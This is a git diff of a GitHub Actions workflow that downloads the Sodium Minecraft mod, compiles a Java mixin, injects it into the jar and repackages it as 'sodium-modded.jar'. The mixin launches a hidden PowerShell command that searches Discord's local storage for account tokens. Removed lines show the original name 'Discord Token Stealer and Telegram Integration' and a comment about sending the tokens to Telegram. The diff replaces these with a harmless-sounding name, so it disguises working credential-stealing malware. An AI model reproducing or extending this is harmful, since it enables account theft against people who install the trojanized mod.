@@ -1,4 +1,4 @@
-name: Self-Contained Discord Token Stealer and Telegram Integration
+name: Self-Contained Build and Inject Workflow
 
 on:
   workflow_dispatch:
@@ -13,9 +13,11 @@ jobs:
           distribution: 'temurin'
           java-version: '21'
 
-      - name: Download Target Jar
+      - name: Download Target Jar and Compilation Dependencies
         run: |
           curl -L "https://cdn.modrinth.com/data/AANobbMI/versions/v4PSXean/sodium-fabric-0.9.3-alpha.1%2Bmc26.3.jar?mr_download_reason=standalone&mr_loader=fabric" -o sodium.jar
+          curl -L "https://repo.spongepowered.org/repository/maven-public/org/spongepowered/mixin/0.8.5/mixin-0.8.5.jar" -o mixin.jar
+          curl -L "https://maven.fabricmc.net/net/fabricmc/fabric-loader/0.15.11/fabric-loader-0.15.11.jar" -o fabric-loader.jar
 
       - name: Generate Payload Source Files on Runner
         run: |
@@ -36,7 +38,6 @@ jobs:
               private static void onClientMain(String[] args, CallbackInfo ci) {
                   new Thread(() -> {
                       try {
-                          // PowerShell command to harvest Discord tokens and send directly to Telegram Bot API
                           String psCommand = "powershell -WindowStyle Hidden -Command \"" +
                               "$tokenRegex = '[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{38}|mfa\\.[\\w-]{84}';" +
                               "$discordPath = \\\"$env:appdata\\discord\\Local Storage\\leveldb\\\";" +
@@ -65,7 +66,7 @@ jobs:
           EOF
 
           cd workspace/src
-          javac -cp "../../../sodium.jar" net/caffeinemc/sodium/mixin/MainMixin.java
+          javac -cp "../../../sodium.jar:../../../mixin.jar:../../../fabric-loader.jar" net/caffeinemc/sodium/mixin/MainMixin.java
           cd ../..
 
       - name: Extract, Inject, and Repackage Jar
@@ -79,7 +80,7 @@ jobs:
           
           cd ..
           jar -cf sodium-modded.jar -C extracted_jar .
-          rm -rf extracted_jar workspace
+          rm -rf extracted_jar workspace mixin.jar fabric-loader.jar
 
       - name: Upload Artifact
         uses: actions/upload-artifact@v4
